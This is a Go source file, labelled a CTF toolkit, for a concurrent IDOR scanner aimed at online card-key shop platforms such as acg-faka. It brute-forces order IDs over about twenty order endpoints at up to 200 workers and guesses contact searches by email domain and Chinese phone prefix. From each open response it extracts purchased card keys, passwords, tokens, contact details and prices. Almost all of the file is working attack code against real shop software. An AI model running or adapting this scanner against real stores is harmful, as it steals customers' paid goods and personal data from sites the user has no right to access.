// CTF Toolkit: IDOR Order Scanner (Go)
// ======================================
// 三层并发: 多URL × 多端点 × 多订单号
// 编译: go build -o idor_scan idor_order_scanner.go
// 用法: ./idor_scan -url https://target -brute 1-5000 -workers 200
// 输出格式: [订单号] 交易号 | 商品名 | ¥价格 | 卡密...

package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ============================================================
// BruteEndpoint — universal, framework-agnostic
// ============================================================

type BruteEndpoint struct {
	Method string
	Path   string
	Param  string // GET param name or POST body template (supports {id})
	Desc   string
}

var UniversalBruteEndpoints = []BruteEndpoint{
	{"GET", "/user/personal/purchaseRecord", "tradeNo", "acg-faka购买记录"},
	{"GET", "/order/detail", "id", "通用订单详情"},
	{"GET", "/trade/detail", "id", "通用交易详情"},
	{"GET", "/user/order/detail", "id", "用户订单详情"},
	{"GET", "/user/trade/detail", "id", "用户交易详情"},
	{"GET", "/api/order/{id}", "", "RESTful订单"},
	{"GET", "/api/orders/{id}", "", "RESTful订单(复数)"},
	{"GET", "/api/trade/{id}", "", "RESTful交易"},
	{"GET", "/api/v1/order/{id}", "", "RESTful v1订单"},
	{"GET", "/order/{id}", "", "短链接订单"},
	{"POST", "/user/api/order/detail", "tradeNo", "订单详情API"},
	{"POST", "/user/api/index/query", "tradeNo", "订单查询API"},
	{"POST", "/user/api/trade/detail", "tradeNo", "交易详情API"},
	{"POST", "/ajax.php", "act=query&tradeNo={id}", "Annie Mall"},
	{"POST", "/api/order/query", "tradeNo", "通用订单查询"},
	{"GET", "/admin/order/detail", "id", "管理后台订单"},
	{"GET", "/manage/order/view", "id", "管理后台订单"},
	{"GET", "/share/{id}", "", "订单分享页"},
	{"GET", "/look/{id}", "", "订单查看页"},
	{"GET", "/view/{id}", "", "订单查看页"},
	{"GET", "/s/{id}", "", "短链接分享"},
}

// ============================================================
// Secret field extraction
// ============================================================

var secretFields = []string{
	"secret", "card_info", "card_key", "security_key", "trade_no",
	"tradeNo", "order_id", "orderId", "password", "token",
	"key", "code", "account", "email", "link", "url",
	"content", "data", "info", "contact", "amount", "price",
	"goods", "product", "name", "card", "value",
}

var flagPattern = regexp.MustCompile(`(?i)(flag|ctf|dasctf)\{[^}]+\}`)

// Preset filters
var fastIndices = []int{0, 1, 5, 10, 11, 14}

func filterEndpoints(preset string) []BruteEndpoint {
	switch preset {
	case "fast":
		var eps []BruteEndpoint
		for _, idx := range fastIndices {
			if idx < len(UniversalBruteEndpoints) {
				eps = append(eps, UniversalBruteEndpoints[idx])
			}
		}
		return eps
	case "restful":
		var eps []BruteEndpoint
		for _, ep := range UniversalBruteEndpoints {
			if ep.Method == "GET" && strings.Contains(ep.Path, "{id}") {
				eps = append(eps, ep)
			}
		}
		return eps
	case "get":
		var eps []BruteEndpoint
		for _, ep := range UniversalBruteEndpoints {
			if ep.Method == "GET" {
				eps = append(eps, ep)
			}
		}
		return eps
	case "post":
		var eps []BruteEndpoint
		for _, ep := range UniversalBruteEndpoints {
			if ep.Method == "POST" {
				eps = append(eps, ep)
			}
		}
		return eps
	default:
		return UniversalBruteEndpoints
	}
}

// ============================================================
// Response Classification
// ============================================================

type RespClass int

const (
	RespOpen RespClass = iota
	RespAuthBlocked
	RespNotFound
	RespEmpty
	RespWafBlocked
	RespError
)

func (c RespClass) String() string {
	return [...]string{"open", "auth_blocked", "not_found", "empty", "waf_blocked", "error"}[c]
}

func (c RespClass) Icon() string {
	return [...]string{"[+]", "[-]", "[x]", "[.]", "[W]", "[!]"}[c]
}

func classifyResp(status int, body string) RespClass {
	lower := strings.ToLower(body)
	if status == 0 {
		return RespError
	}
	if (status == 403 || status == 503) && len(body) < 8000 {
		return RespWafBlocked
	}
	if status == 404 || strings.Contains(lower, "404 not found") || strings.Contains(lower, "not found") {
		return RespNotFound
	}
	for _, kw := range []string{
		"登录", "login", "请先登录", "会话过期", "session expire",
		"请登录", "未登录", "unauthorized", "权限不足", "forbidden", "权限", "无权", "禁止",
	} {
		if strings.Contains(lower, kw) {
			return RespAuthBlocked
		}
	}
	if status == 200 && len(body) < 200 {
		return RespEmpty
	}
	if status == 200 {
		return RespOpen
	}
	return RespNotFound
}

// ============================================================
// Secret Extraction
// ============================================================

func extractSecrets(body string) map[string][]string {
	found := make(map[string][]string)
	for _, field := range secretFields {
		pat := regexp.MustCompile(fmt.Sprintf(`"%s"\s*:\s*"([^"]*)"`, field))
		matches := pat.FindAllStringSubmatch(body, -1)
		if len(matches) > 0 {
			seen := make(map[string]bool)
			var uniq []string
			for _, m := range matches {
				if len(m) > 1 && m[1] != "" && len(m[1]) < 5000 {
					if !seen[m[1]] {
						seen[m[1]] = true
						uniq = append(uniq, m[1])
					}
				}
			}
			if len(uniq) > 0 {
				if len(uniq) > 20 {
					uniq = uniq[:20]
				}
				found[field] = uniq
			}
		}
	}
	flags := flagPattern.FindAllString(body, -1)
	if len(flags) > 0 {
		found["FLAG"] = flags
	}
	return found
}

// ============================================================
// Scanner
// ============================================================

type Scanner struct {
	client  *http.Client
	baseURL string
	cookie  string
	timeout time.Duration
}

func NewScanner(baseURL, cookie string, timeout time.Duration) *Scanner {
	return &Scanner{
		client: &http.Client{
			Timeout: timeout,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
		baseURL: strings.TrimRight(baseURL, "/"),
		cookie:  cookie,
		timeout: timeout,
	}
}

func (s *Scanner) buildRequest(ep BruteEndpoint, oid int) (*http.Request, error) {
	reqPath := strings.ReplaceAll(ep.Path, "{id}", fmt.Sprintf("%d", oid))
	reqURL := s.baseURL + reqPath

	if ep.Method == "GET" {
		if ep.Param != "" {
			paramStr := strings.ReplaceAll(ep.Param, "{id}", fmt.Sprintf("%d", oid))
			if strings.Contains(reqURL, "?") {
				reqURL += "&" + paramStr
			} else {
				reqURL += "?" + paramStr
			}
		}
		req, err := http.NewRequest("GET", reqURL, nil)
		return req, err
	}

	body := ""
	if ep.Param != "" {
		if strings.Contains(ep.Param, "=") {
			body = strings.ReplaceAll(ep.Param, "{id}", fmt.Sprintf("%d", oid))
		} else {
			body = fmt.Sprintf("%s=%d", ep.Param, oid)
		}
	}
	req, err := http.NewRequest("POST", reqURL, strings.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return req, nil
}

// ============================================================
// Probe (quick test orders 1-5)
// ============================================================

func (s *Scanner) probeEndpoint(ep BruteEndpoint) RespClass {
	classesSeen := make(map[RespClass]int)
	for oid := 1; oid <= 5; oid++ {
		req, err := s.buildRequest(ep, oid)
		if err != nil {
			return RespError
		}
		if s.cookie != "" {
			req.Header.Set("Cookie", s.cookie)
		}
		req.Header.Set("User-Agent", "ReverseLab-IDOR/2.0")
		resp, err := s.client.Do(req)
		if err != nil {
			return RespError
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		cls := classifyResp(resp.StatusCode, string(body))
		classesSeen[cls]++
	}
	if classesSeen[RespOpen] > 0 {
		return RespOpen
	}
	if classesSeen[RespEmpty] > 0 {
		return RespEmpty
	}
	if classesSeen[RespAuthBlocked] > 0 {
		return RespAuthBlocked
	}
	return RespNotFound
}

// ============================================================
// Brute-Force Range (single endpoint)
// ============================================================

type ProbeResult struct {
	OrderID int               `json:"order_id"`
	Class   string            `json:"class"`
	Status  int               `json:"status"`
	Len     int               `json:"len,omitempty"`
	Secrets map[string][]string `json:"secrets,omitempty"`
}

type Finding struct {
	Endpoint string `json:"endpoint"`
	ProbeResult
}

// scanRange brute-forces a range of order IDs
func (s *Scanner) scanRange(ep BruteEndpoint, start, end int, workers int, delay time.Duration) ([]Finding, map[RespClass]int64) {
	var (
		findings []Finding
		mu       sync.Mutex
		done     int64
		total    = end - start + 1
		stats    = make(map[RespClass]int64)
		statsMu  sync.Mutex
		wg       sync.WaitGroup
		orderCh  = make(chan int, workers*2)
	)

	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for oid := range orderCh {
				if delay > 0 {
					time.Sleep(delay)
				}
				req, err := s.buildRequest(ep, oid)
				if err != nil {
					atomic.AddInt64(&done, 1)
					statsMu.Lock()
					stats[RespError]++
					statsMu.Unlock()
					continue
				}
				if s.cookie != "" {
					req.Header.Set("Cookie", s.cookie)
				}
				req.Header.Set("User-Agent", "ReverseLab-IDOR/2.0")

				resp, err := s.client.Do(req)
				if err != nil {
					atomic.AddInt64(&done, 1)
					statsMu.Lock()
					stats[RespError]++
					statsMu.Unlock()
					continue
				}
				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				body := string(bodyBytes)
				cls := classifyResp(resp.StatusCode, body)

				statsMu.Lock()
				stats[cls]++
				statsMu.Unlock()

				if cls == RespOpen {
					secrets := extractSecrets(body)
					if len(secrets) > 0 {
						mu.Lock()
						findings = append(findings, Finding{
							Endpoint: ep.Path,
							ProbeResult: ProbeResult{
								OrderID: oid,
								Class:   cls.String(),
								Status:  resp.StatusCode,
								Len:     len(body),
								Secrets: secrets,
							},
						})
						mu.Unlock()
					}
				}
				atomic.AddInt64(&done, 1)
			}
		}()
	}

	go func() {
		for oid := start; oid <= end; oid++ {
			orderCh <- oid
		}
		close(orderCh)
	}()

	// Progress
	stopProgress := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				d := atomic.LoadInt64(&done)
				pct := float64(d) * 100 / float64(total)
				bar := strings.Repeat("=", int(pct/5))
				remain := strings.Repeat(".", 20-int(pct/5))
				if int(pct/5) < 20 {
					bar += ">"
					remain = remain[1:]
				}
				statsMu.Lock()
				a := stats[RespAuthBlocked]
				n := stats[RespNotFound]
				e := stats[RespEmpty]
				w := stats[RespWafBlocked]
				h := len(findings)
				statsMu.Unlock()
				fmt.Fprintf(os.Stderr, "\r  [%s] %d/%d (%.0f%%) hits:%d A:%d N:%d E:%d W:%d          ",
					bar+remain, d, total, pct, h, a, n, e, w)
			case <-stopProgress:
				return
			}
		}
	}()

	wg.Wait()
	close(stopProgress)
	fmt.Fprintln(os.Stderr)
	return findings, stats
}

// ============================================================
// Multi-Endpoint Orchestration
// ============================================================

type ScanConfig struct {
	Start, End int
	Workers    int
	Delay      time.Duration
	ProbeFirst bool
	Cookie     string
	Preset     string
	CustomEP   BruteEndpoint
	Timeout    time.Duration
}

func (cfg ScanConfig) endpoints() []BruteEndpoint {
	if cfg.CustomEP.Path != "" {
		return []BruteEndpoint{cfg.CustomEP}
	}
	return filterEndpoints(cfg.Preset)
}

func scanTarget(targetURL string, cfg ScanConfig) []Finding {
	scanner := NewScanner(targetURL, cfg.Cookie, cfg.Timeout)
	endpoints := cfg.endpoints()

	fmt.Fprintf(os.Stderr, "\n%s\n", strings.Repeat("=", 60))
	fmt.Fprintf(os.Stderr, "[*] %s | %d endpoints | %d-%d | %d workers\n",
		targetURL, len(endpoints), cfg.Start, cfg.End, cfg.Workers)

	// Phase 1: Quick probe
	viable := make([]BruteEndpoint, 0)
	blocked := make([]BruteEndpoint, 0)

	if cfg.ProbeFirst && len(endpoints) > 1 {
		fmt.Fprintf(os.Stderr, "\n[Phase 1] Quick probe %d endpoints (orders 1-5)\n", len(endpoints))
		fmt.Fprintf(os.Stderr, "%s\n", strings.Repeat("-", 60))

		type probeResult struct {
			ep  BruteEndpoint
			cls RespClass
		}
		probeCh := make(chan probeResult, len(endpoints))
		var probeWg sync.WaitGroup

		for _, ep := range endpoints {
			probeWg.Add(1)
			go func(ep BruteEndpoint) {
				defer probeWg.Done()
				cls := scanner.probeEndpoint(ep)
				probeCh <- probeResult{ep, cls}
			}(ep)
		}
		probeWg.Wait()
		close(probeCh)

		for pr := range probeCh {
			fmt.Fprintf(os.Stderr, "  %s %-4s %-45s -> %-15s (%s)\n",
				pr.cls.Icon(), pr.ep.Method, pr.ep.Path, pr.cls.String(), pr.ep.Desc)
			if pr.cls == RespOpen || pr.cls == RespEmpty {
				viable = append(viable, pr.ep)
			} else if pr.cls == RespAuthBlocked {
				blocked = append(blocked, pr.ep)
			}
		}
		fmt.Fprintf(os.Stderr, "\n  可达:%d | 需认证:%d | 总数:%d\n", len(viable), len(blocked), len(endpoints))

		if len(viable) == 0 && len(blocked) > 0 {
			fmt.Fprintf(os.Stderr, "[*] 无可达端点, 对需认证端点的前3个做试扫...\n")
			if len(blocked) > 3 {
				blocked = blocked[:3]
			}
			viable = blocked
		}
	} else {
		viable = endpoints
	}

	if len(viable) == 0 {
		fmt.Fprintf(os.Stderr, "[*] 无可扫描端点\n")
		return nil
	}

	// Phase 2: Concurrent brute
	epWorkers := cfg.Workers / len(viable)
	if epWorkers < 10 {
		epWorkers = 10
	}

	fmt.Fprintf(os.Stderr, "\n[Phase 2] %d endpoints × %d workers each\n", len(viable), epWorkers)
	fmt.Fprintf(os.Stderr, "%s\n", strings.Repeat("=", 60))

	var allFindings []Finding
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, ep := range viable {
		wg.Add(1)
		go func(ep BruteEndpoint) {
			defer wg.Done()
			fmt.Fprintf(os.Stderr, "\n--- %s %s (%s) ---\n", ep.Method, ep.Path, ep.Desc)
			findings, _ := scanner.scanRange(ep, cfg.Start, cfg.End, epWorkers, cfg.Delay)
			if len(findings) > 0 {
				mu.Lock()
				allFindings = append(allFindings, findings...)
				mu.Unlock()
			}
		}(ep)
	}
	wg.Wait()
	return allFindings
}

// ============================================================
// Output matching expected format
// ============================================================

func printFinding(f Finding) {
	secrets := f.Secrets

	// 尝试还原 dimosky/beigpt 格式的输出
	tradeNo := firstOf(secrets, "trade_no", "tradeNo", "order_id", "orderId")
	goodsName := firstOf(secrets, "name", "product", "goods")
	amount := firstOf(secrets, "amount", "price")
	cardInfo := firstOf(secrets, "card_info", "card_key", "secret", "card")
	contact := firstOf(secrets, "contact")
	pwd := firstOf(secrets, "password")

	if len(cardInfo) == 0 {
		// fallback: dump all non-empty secret values
		var parts []string
		for k, vals := range secrets {
			if k != "FLAG" {
				for _, v := range vals {
					if v != "" && len(v) > 3 {
						parts = append(parts, fmt.Sprintf("%s=%s", k, v))
					}
				}
			}
		}
		fmt.Printf("[%d] %s | %s | ¥ %s\n", f.OrderID, tradeNo, goodsName, amount)
		if len(contact) > 0 {
			fmt.Printf("    联系: %s\n", contact)
		}
		fmt.Printf("    数据: %s\n", strings.Join(parts, " | "))
	} else {
		fmt.Printf("[%d] %s | %-30s | ¥%6s\n", f.OrderID, tradeNo, goodsName, amount)
		if len(contact) > 0 {
			fmt.Printf("    联系: %s\n", contact)
		}
		if len(pwd) > 0 && pwd != "否" && pwd != "false" && pwd != "0" {
			fmt.Printf("    密码: %s\n", pwd)
		}
		fmt.Printf("    卡密: %s\n", cardInfo)
	}

	// FLAG
	if flags, ok := secrets["FLAG"]; ok {
		for _, fl := range flags {
			fmt.Printf("    🏴 %s\n", fl)
		}
	}
}

func firstOf(m map[string][]string, keys ...string) string {
	for _, k := range keys {
		if vals, ok := m[k]; ok && len(vals) > 0 {
			return vals[0]
		}
	}
	return ""
}

// ============================================================
// Contact-Based Search (联系方式爆破)
// ============================================================

// ContactSearchEndpoints — 按联系方式搜索订单的端点
var ContactSearchEndpoints = []BruteEndpoint{
	{"POST", "/user/api/index/query", "keywords={kw}", "acg-faka订单查询(关键词)"},
	{"POST", "/ajax.php", "act=query&type={kw}", "Annie Mall style"},
	{"POST", "/user/api/order/search", "keyword={kw}", "通用订单搜索"},
	{"GET", "/user/api/order/search", "keyword={kw}", "通用订单搜索(GET)"},
	{"POST", "/api/order/search", "keyword={kw}", "RESTful搜索"},
	{"POST", "/user/personal/purchaseRecord", "keywords={kw}", "购买记录搜索"},
	{"POST", "/user/api/index/query", "contact={kw}", "联系方式查询"},
}

// GenerateContactPatterns generates contact patterns to brute-force
func GenerateContactPatterns() []string {
	var patterns []string

	// Popular email domains — search by domain suffix alone often returns ALL orders
	emailDomains := []string{
		"@qq.com", "@gmail.com", "@163.com", "@126.com", "@outlook.com",
		"@hotmail.com", "@yahoo.com", "@icloud.com", "@sina.com", "@foxmail.com",
		"@proton.me", "@pm.me", "@live.com", "@yeah.net", "@aliyun.com",
		"@rambler.ru", "@mail.ru", "@yandex.ru", "@gmx.com", "@web.de",
	}
	patterns = append(patterns, emailDomains...)

	// Email search with common prefixes
	commonPrefixes := []string{"admin", "test", "info", "contact", "support",
		"hello", "shop", "vip", "service", "mail", "user", "2024", "2025", "2026"}
	for _, dom := range []string{"@qq.com", "@gmail.com", "@163.com", "@outlook.com"} {
		for _, prefix := range commonPrefixes {
			patterns = append(patterns, prefix+dom)
		}
	}

	// Phone patterns (China mobile)
	phonePrefixes := []string{"130", "131", "132", "133", "134", "135", "136",
		"137", "138", "139", "150", "151", "152", "153", "155", "156",
		"157", "158", "159", "166", "170", "171", "172", "173", "174",
		"175", "176", "177", "178", "180", "181", "182", "183", "184",
		"185", "186", "187", "188", "189", "191", "198", "199"}
	// Search by phone prefix — may match partial
	for _, pfx := range phonePrefixes {
		patterns = append(patterns, pfx)
	}

	// QQ-like patterns
	for i := 10000; i <= 99999; i += 11111 {
		patterns = append(patterns, fmt.Sprintf("%d", i))
	}

	// Empty / wildcard
	patterns = append(patterns, "", "1", "a", "admin")

	return patterns
}

// scanContact brute-forces contact search on a single endpoint
func (s *Scanner) scanContact(ep BruteEndpoint, patterns []string, workers int, delay time.Duration) []Finding {
	var (
		findings []Finding
		mu       sync.Mutex
		done     int64
		total    = int64(len(patterns))
		patternCh = make(chan string, workers*2)
		wg       sync.WaitGroup
	)

	// Worker pool
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for kw := range patternCh {
				if delay > 0 {
					time.Sleep(delay)
				}
				// Build request — replace {kw} in param
				reqPath := ep.Path
				reqURL := s.baseURL + reqPath
				var req *http.Request

				if ep.Method == "GET" {
					paramStr := strings.ReplaceAll(ep.Param, "{kw}", kw)
					if strings.Contains(reqURL, "?") {
						reqURL += "&" + paramStr
					} else {
						reqURL += "?" + paramStr
					}
					req, _ = http.NewRequest("GET", reqURL, nil)
				} else {
					body := strings.ReplaceAll(ep.Param, "{kw}", kw)
					req, _ = http.NewRequest("POST", reqURL, strings.NewReader(body))
					req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				}

				if s.cookie != "" {
					req.Header.Set("Cookie", s.cookie)
				}
				req.Header.Set("User-Agent", "ReverseLab-IDOR/2.0")

				resp, err := s.client.Do(req)
				if err != nil {
					atomic.AddInt64(&done, 1)
					continue
				}
				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				body := string(bodyBytes)
				cls := classifyResp(resp.StatusCode, body)

				if cls == RespOpen {
					secrets := extractSecrets(body)
					// Filter: must have actual order data, not just "success:true"
					hasOrderData := len(secrets) > 1 ||
						(len(secrets) == 1 && len(secrets["FLAG"]) > 0)
					if hasOrderData || strings.Contains(body, "tradeNo") ||
						strings.Contains(body, "card_info") || strings.Contains(body, "card_key") {
						mu.Lock()
						findings = append(findings, Finding{
							Endpoint: ep.Path,
							ProbeResult: ProbeResult{
								OrderID: 0, // contact search doesn't have order ID
								Class:   cls.String(),
								Status:  resp.StatusCode,
								Len:     len(body),
								Secrets: secrets,
							},
						})
						// Multiple orders in one response — try to split
						if strings.Count(body, `"id"`) > 1 || strings.Count(body, `"tradeNo"`) > 1 {
							fmt.Fprintf(os.Stderr, "\n  [+] %q → %d items in batch response (%d bytes)\n",
								kw, strings.Count(body, `"tradeNo"`)+strings.Count(body, `"id":`), len(body))
						}
						mu.Unlock()
					}
				}
				atomic.AddInt64(&done, 1)
			}
		}()
	}

	// Feed patterns
	go func() {
		for _, kw := range patterns {
			patternCh <- kw
		}
		close(patternCh)
	}()

	// Progress
	stopProgress := make(chan struct{})
	go func() {
		ticker := time.NewTicker(500 * time.Millisecond)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				d := atomic.LoadInt64(&done)
				pct := float64(d) * 100 / float64(total)
				fmt.Fprintf(os.Stderr, "\r  [contact] %d/%d (%.0f%%) hits:%d          ",
					d, total, pct, len(findings))
			case <-stopProgress:
				return
			}
		}
	}()

	wg.Wait()
	close(stopProgress)
	fmt.Fprintln(os.Stderr)
	return findings
}

// ============================================================
// CLI
// ============================================================

func main() {
	urlFlag := flag.String("url", "", "目标URL (多个逗号分隔)")
	bruteFlag := flag.String("brute", "", "brute模式: 订单号范围 (如 1-5000)")
	presetFlag := flag.String("brute-preset", "all", "端点预设: all|fast|restful|get|post")
	workersFlag := flag.Int("workers", 200, "并发数")
	delayFlag := flag.Float64("delay", 0, "请求间隔秒数")
	probeFlag := flag.Bool("probe-first", true, "先快速探测端点")
	cookieFlag := flag.String("cookie", "", "Cookie字符串")
	outputFlag := flag.String("o", "", "JSON输出文件")
	endpointFlag := flag.String("endpoint", "", "自定义端点路径 (覆盖预设)")
	methodFlag := flag.String("method", "GET", "自定义HTTP方法")
	paramFlag := flag.String("param", "tradeNo", "自定义参数名")
	flag.Parse()

	if *urlFlag == "" {
		fmt.Fprintf(os.Stderr, "IDOR Order Scanner (Go) - 三层并发\n")
		fmt.Fprintf(os.Stderr, "用法: %s -url https://target -brute 1-5000 -workers 200\n", os.Args[0])
		flag.PrintDefaults()
		os.Exit(1)
	}

	urls := strings.Split(*urlFlag, ",")
	for i := range urls {
		urls[i] = strings.TrimSpace(urls[i])
	}

	var start, end int
	if *bruteFlag != "" {
		parts := strings.Split(strings.ReplaceAll(*bruteFlag, ",", "-"), "-")
		if len(parts) >= 2 {
			fmt.Sscanf(parts[0], "%d", &start)
			fmt.Sscanf(parts[1], "%d", &end)
		}
	}
	if end == 0 {
		end = 100
	}

	cfg := ScanConfig{
		Start:      start,
		End:        end,
		Workers:    *workersFlag,
		Delay:      time.Duration(*delayFlag * float64(time.Second)),
		ProbeFirst: *probeFlag,
		Cookie:     *cookieFlag,
		Preset:     *presetFlag,
		Timeout:    15 * time.Second,
	}

	if *endpointFlag != "" {
		cfg.CustomEP = BruteEndpoint{
			Method: *methodFlag,
			Path:   *endpointFlag,
			Param:  *paramFlag,
			Desc:   "自定义端点",
		}
	}

	fmt.Fprintf(os.Stderr, "╔══════════════════════════════════════════════╗\n")
	fmt.Fprintf(os.Stderr, "║  IDOR Order Scanner (Go) — Multi-URL × Multi-EP ║\n")
	fmt.Fprintf(os.Stderr, "╚══════════════════════════════════════════════╝\n")

	var allFindings []Finding
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, targetURL := range urls {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			findings := scanTarget(url, cfg)
			if len(findings) > 0 {
				mu.Lock()
				allFindings = append(allFindings, findings...)
				mu.Unlock()
			}
		}(targetURL)
	}
	wg.Wait()

	// Print ALL findings in table format
	fmt.Fprintf(os.Stderr, "\n%s\n", strings.Repeat("=", 60))
	fmt.Fprintf(os.Stderr, "[+] TOTAL HITS: %d\n", len(allFindings))
	fmt.Fprintf(os.Stderr, "%s\n\n", strings.Repeat("=", 60))

	for _, f := range allFindings {
		printFinding(f)
		fmt.Println()
	}

	// JSON output
	if *outputFlag != "" {
		type Output struct {
			Targets  []string  `json:"targets"`
			Findings []Finding `json:"findings"`
			Total    int       `json:"total_hits"`
		}
		out := Output{Targets: urls, Findings: allFindings, Total: len(allFindings)}
		data, _ := json.MarshalIndent(out, "", "  ")
		os.WriteFile(*outputFlag, data, 0644)
		fmt.Fprintf(os.Stderr, "[+] JSON → %s\n", *outputFlag)
	}
}
